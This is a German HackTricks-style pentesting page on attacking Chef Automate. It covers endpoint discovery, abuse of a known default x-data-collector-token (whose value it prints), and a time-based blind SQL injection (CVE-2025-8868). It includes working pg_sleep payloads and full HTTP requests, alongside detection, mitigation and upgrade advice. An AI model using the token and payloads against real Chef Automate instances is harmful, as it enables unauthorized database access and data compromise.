# Chef Automate Aufklärung & Angriffe

{{#include ../../banners/hacktricks-training.md}}

## Übersicht

Diese Seite sammelt praktische Techniken, um Chef Automate-Instanzen zu enumerieren und anzugreifen, mit Schwerpunkt auf:
- Aufdecken von REST-Endpunkten, die von gRPC-Gateway bereitgestellt werden, und Ermitteln von Request-Schemata durch Validierungs-/Fehlerantworten
- Missbrauch des Headers x-data-collector-token zur Authentifizierung, wenn Standardwerte vorhanden sind
- Time-based blind SQL injection in der Compliance API (CVE-2025-8868), die das Feld filters[].type in /api/v0/compliance/profiles/search betrifft

> Hinweis: Backend-Antworten, die den Header grpc-metadata-content-type: application/grpc enthalten, deuten typischerweise auf eine gRPC-Gateway-Brücke von REST-Aufrufen zu gRPC-Services hin.

## Recon: Architektur und Fingerabdrücke

- Front-end: Oft Angular. Statische Bundles können auf REST-Pfade hinweisen (z. B. /api/v0/...)
- API-Transport: REST zu gRPC via gRPC-Gateway
- Antworten können grpc-metadata-content-type: application/grpc enthalten
- Datenbank-/Treiber-Fingerprints:
- Fehlerkörper, die mit pq: beginnen, deuten stark auf PostgreSQL mit dem Go pq-Driver hin
- Interessante Compliance-Endpunkte (Auth erforderlich):
- POST /api/v0/compliance/profiles/search
- POST /api/v0/compliance/scanner/jobs/search

## Auth: Data Collector Token (x-data-collector-token)

Chef Automate stellt einen Data Collector bereit, der Requests über einen dedizierten Header authentifiziert:

- Header: x-data-collector-token
- Risiko: In einigen Umgebungen kann ein Default-Token erhalten bleiben, das Zugriff auf geschützte API-Routen gewährt. Bekannter Standardwert, der in freier Wildbahn beobachtet wurde:
- 93a49a4f2482c64126f7b6015e6b0f30284287ee4054ff8807fb63d9cbd1c506

Ist dieses Token vorhanden, kann es verwendet werden, um Compliance-API-Endpunkte aufzurufen, die ansonsten durch Auth geschützt sind. Versuchen Sie beim Härten immer, Default-Werte zu rotieren/deaktivieren.

## API-Schema-Ermittlung via fehlergetriebener Discovery

gRPC-Gateway-backed Endpunkte leak oft nützliche Validierungsfehler, die das erwartete Request-Modell beschreiben.

Für /api/v0/compliance/profiles/search erwartet das Backend einen Body mit einem filters-Array, wobei jedes Element ein Objekt mit folgenden Feldern ist:

- type: string (Filterfeld-Identifier)
- values: array of strings

Beispielhafte Request-Struktur:
```json
{
"filters": [
{ "type": "name", "values": ["test"] }
]
}
```
Fehlerhaftes JSON oder falsche Feldtypen lösen typischerweise 4xx/5xx-Antworten mit Hinweisen aus, und Header zeigen das Verhalten des gRPC-Gateway an. Nutze diese, um Felder zuzuordnen und injection surfaces zu lokalisieren.

## Compliance API SQL Injection (CVE-2025-8868)

- Betroffener Endpoint: POST /api/v0/compliance/profiles/search
- Injection point: filters[].type
- Schwachstellenklasse: time-based blind SQL injection in PostgreSQL
- Ursache: Fehlende ordnungsgemäße parameterization/whitelisting beim Interpolieren des type field in ein dynamisches SQL-Fragment (wahrscheinlich verwendet, um identifiers/WHERE clauses zu konstruieren). Manipulierte Werte im type werden von PostgreSQL ausgewertet.

- Funktionierendes time-based payload:
```json
{"filters":[{"type":"name'||(SELECT pg_sleep(5))||'","values":["test"]}]}
```
Technique notes:
- Schließe den ursprünglichen string mit einem single quote
- Hänge eine subquery an, die pg_sleep(N) aufruft
- Tritt mittels || wieder in den string-Kontext ein, sodass das finale SQL syntaktisch gültig bleibt, unabhängig davon, wo type eingebettet ist

### Nachweis durch differentielle Latenz

Sende gepaarte requests und vergleiche die Antwortzeiten, um server-side execution zu validieren:

- N = 1 Sekunde
```
POST /api/v0/compliance/profiles/search HTTP/1.1
Host: <target>
Content-Type: application/json
x-data-collector-token: 93a49a4f2482c64126f7b6015e6b0f30284287ee4054ff8807fb63d9cbd1c506

{"filters":[{"type":"name'||(SELECT pg_sleep(1))||'","values":["test"]}]}
```
- N = 5 Sekunden
```
POST /api/v0/compliance/profiles/search HTTP/1.1
Host: <target>
Content-Type: application/json
x-data-collector-token: 93a49a4f2482c64126f7b6015e6b0f30284287ee4054ff8807fb63d9cbd1c506

{"filters":[{"type":"name'||(SELECT pg_sleep(5))||'","values":["test"]}]}
```
Beobachtetes Verhalten:
- Antwortzeiten skalieren mit pg_sleep(N)
- HTTP-500-Antworten können während des Probes pq:-Details enthalten, was auf ausgeführte SQL-Pfade hinweist

> Tipp: Verwende einen Timing-Validator (z. B. mehrere Durchläufe mit statistischem Vergleich), um Rauschen und False Positives zu reduzieren.

### Auswirkung

Authentifizierte Benutzer — oder nicht authentifizierte Akteure, die einen Standard-x-data-collector-token missbrauchen — können beliebiges SQL im PostgreSQL-Kontext von Chef Automate ausführen und so die Vertraulichkeit und Integrität von Compliance-Profilen, Konfiguration und Telemetrie gefährden.

### Betroffene Versionen / Behebung

- CVE: CVE-2025-8868
- Upgrade-Empfehlung: Chef Automate 4.13.295 oder neuer (Linux x86) laut Herstellerhinweisen

## Erkennung und Forensik

- API-Ebene:
- Überwache 500s auf /api/v0/compliance/profiles/search, wenn filters[].type Anführungszeichen ('), Konkatenation (||) oder Funktionsreferenzen wie pg_sleep enthält
- Prüfe Response-Header auf grpc-metadata-content-type, um gRPC-Gateway-Flows zu identifizieren
- Datenbank-Ebene (PostgreSQL):
- Prüfe auf pg_sleep-Aufrufe und auf Fehler durch fehlerhafte Identifier (oft mit pq:-Präfixen, die vom Go pq driver kommen)
- Authentifizierung:
- Protokolliere und alarmiere bei Verwendung von x-data-collector-token, insbesondere bekannter Standardwerte, über API-Pfade hinweg

## Abmilderungen und Härtung

- Sofortmaßnahmen:
- Standard-Data-Collector-Tokens rotieren/deaktivieren
- Eingehenden Zugriff auf Data-Collector-Endpunkte beschränken; starke, eindeutige Tokens erzwingen
- Code-Ebene:
- Queries parameterisieren; niemals SQL-Fragmente per String-Konkatenation zusammenfügen
- Zulässige type-Werte auf dem Server strikt per Whitelist einschränken (enum)
- Dynamische SQL-Zusammenstellung für Identifier/Klauseln vermeiden; falls dynamisches Verhalten erforderlich ist, sicheres Identifier-Quoting und explizite Whitelists verwenden

## Praktische Test-Checkliste

- Prüfe, ob x-data-collector-token akzeptiert wird und ob der bekannte Standardwert funktioniert
- Kartiere das Compliance API Request-Schema, indem du Validierungsfehler provozierst und Fehlermeldungen/Headers ausliest
- Teste auf SQLi in weniger offensichtlichen „identifier-like“ Feldern (z. B. filters[].type), nicht nur in Werte-Arrays oder top-level Textfeldern
- Verwende zeitbasierte Techniken mit Konkatenation, um SQL kontextübergreifend syntaktisch gültig zu halten

## Referenzen

- [Cooking an SQL Injection Vulnerability in Chef Automate (XBOW blog)](https://xbow.com/blog/cooking-an-sql-injection-vulnerability-in-chef-automate)
- [Timing trace (XBOW)](https://xbow-website.pages.dev/traces/chef-automate-sql-injection/)
- [CVE-2025-8868](https://www.cve.org/CVERecord?id=CVE-2025-8868)
- [gRPC-Gateway](https://github.com/grpc-ecosystem/grpc-gateway)
- [pq PostgreSQL driver for Go](https://github.com/lib/pq)

{{#include ../../banners/hacktricks-training.md}}
